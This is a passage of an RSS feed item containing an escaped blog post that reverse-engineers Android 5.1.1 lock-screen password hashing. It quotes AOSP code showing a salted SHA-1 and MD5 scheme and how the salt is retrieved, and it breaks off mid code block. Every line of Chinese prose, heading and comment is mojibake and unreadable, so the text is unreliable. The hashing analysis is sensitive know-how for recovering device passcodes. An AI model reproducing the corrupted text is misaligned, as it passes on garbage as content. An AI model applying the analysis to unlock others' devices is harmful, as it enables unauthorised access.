&lt;/div></description></item><item><title>Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡1</title><link>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/</link><pubDate>Mon, 02 Jul 2018 17:33:00 +0800</pubDate><guid>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/</guid><description>&lt;h1 id="androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡1">Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡1&lt;/h1>
&lt;h2 id="ç¬¬ä¸€ç« -androidä¸­é”å±å¯†ç åŠ å¯†ç®—æ³•åˆ†æ">ç¬¬ä¸€ç«  Androidä¸­é”å±å¯†ç åŠ å¯†ç®—æ³•åˆ†æ&lt;/h2>
&lt;h3 id="1-é”å±å¯†ç æ–¹å¼">1. é”å±å¯†ç æ–¹å¼ï¼š&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>æ‰‹åŠ¿&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¹å®«æ ¼è¿çº¿&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¾“å…¥å¯†ç &lt;/p>
&lt;/li>
&lt;li>
&lt;p>æŒ‡çº¹ã€äººè„¸ã€è™¹è†œ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯ç©¿æˆ´è®¾å¤‡&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="2-è¿™å„¿åˆ†ææ‰‹åŠ¿å¯†ç å’Œè¾“å…¥å¯†ç ">2. è¿™å„¿åˆ†ææ‰‹åŠ¿å¯†ç å’Œè¾“å…¥å¯†ç &lt;/h3>
&lt;p>æ‰¾åˆ°androidæºä»£ç ä¸­çš„LockPatternUtils,java è¿™ä¸ªå·¥å…·ç±»&lt;/p>
&lt;p>è·¯å¾„ï¼šAndroid-5.1.1\frameworks\base\core\java\com\android\internal\widget&lt;/p>
&lt;blockquote>
&lt;p>2.1 è¾“å…¥å¯†ç ç®—æ³•åˆ†æ (5.1ç‰ˆæœ¬çš„æºä»£ç  å’Œä¹¦ä¸Šç»†å¾®å·®å¼‚)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="nf">passwordToHash&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>&lt;span class="c1">//å‚æ•°ä¸ºå¯†ç å’Œå¯¹åº”ç”¨æˆ·ID é»˜è®¤0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">password&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">saltedPassword&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">password&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">getSalt&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">userId&lt;/span>&lt;span class="o">)).&lt;/span>&lt;span class="na">getBytes&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">sha1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MessageDigest&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;SHA-1&amp;#34;&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">digest&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">saltedPassword&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">md5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MessageDigest&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;MD5&amp;#34;&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">digest&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">saltedPassword&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//é¦–å…ˆè®© password+saltå€¼ å†SHA-1å’ŒMD5
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">combined&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">sha1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">md5&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">arraycopy&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sha1&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">combined&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">sha1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">arraycopy&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">md5&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">combined&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">sha1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">md5&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//è£…æ¢æˆhexå€¼ å†æ‹¼æ¥èµ·æ¥
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">hexEncoded&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HexEncoding&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">encode&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">combined&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">hexEncoded&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">getBytes&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">StandardCharsets&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">UTF_8&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">NoSuchAlgorithmException&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">AssertionError&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Missing digest algorithm: &amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚ä½•è·å–è®¾å¤‡å¯¹åº”çš„saltå€¼ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">getSalt&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">long&lt;/span> &lt;span class="n">salt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getLong&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">LOCK_PASSWORD_SALT_KEY&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">salt&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="c1">//å€¼ä¸º0 é‡æ–°ç”Ÿæˆ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">salt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SecureRandom&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;SHA1PRNG&amp;#34;&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">nextLong&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">setLong&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">LOCK_PASSWORD_SALT_KEY&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//ä¿å­˜å€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">v&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">TAG&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="s">&amp;#34;Initialized lock password salt for user: &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">NoSuchAlgorithmException&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">IllegalStateException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Couldn&amp;#39;t get SecureRandom number&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Long&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toHexString&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">// hexä¹‹åè¿”å›
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç»§ç»­è·Ÿè¸ª çœ‹ä¿å­˜çš„åœ°æ–¹&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="nf">getLong&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">secureSettingKey&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">defaultValue&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">userHandle&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">getLockSettings&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">getLong&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">secureSettingKey&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">defaultValue&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">userHandle&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">RemoteException&lt;/span> &lt;span class="n">re&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">defaultValue&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç»§ç»­è·Ÿè¸ªä»£ç &lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@VisibleForTesting&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ILockSettings&lt;/span> &lt;span class="nf">getLockSettings&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">mLockSettingsService&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ILockSettings&lt;/span> &lt;span class="n">service&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ILockSettings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Stub&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">asInterface&lt;/span>&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ServiceManager&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getService&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;lock_settings&amp;#34;&lt;/span>&lt;span class="o">));&lt;/span> &lt;span class="c1">//è·å–æœåŠ¡æ¥æ“ä½œ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">mLockSettingsService&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">service&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">mLockSettingsService&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åœ¨androidä¸­ è¿™ç§è·å–æœåŠ¡çš„æ–¹å¼æœ€ç»ˆå®ç°é€»è¾‘éƒ½æ˜¯åœ¨XXXServiceç±»ä¸­&lt;/p>
&lt;p>è¿™é‡Œåœ¨LockSettingService.javaä¸­ æ‰¾åˆ°è¿™ä¸ªç±»çš„getLongæ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="nf">getLong&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">defaultValue&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">checkReadPermission&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">String&lt;/span> &lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getStringUnchecked&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">userId&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">TextUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isEmpty&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="n">defaultValue&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">Long&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">parseLong&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¿å­˜åœ¨æ•°æ®åº“ï¼Ÿ&lt;/p>
&lt;p>ç»§ç»­è·Ÿè¸ª&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">static&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">Injector&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">protected&lt;/span> &lt;span class="n">Context&lt;/span> &lt;span class="n">mContext&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">Injector&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Context&lt;/span> &lt;span class="n">context&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mContext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">context&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">Context&lt;/span> &lt;span class="nf">getContext&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">mContext&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">Handler&lt;/span> &lt;span class="nf">getHandler&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Handler&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
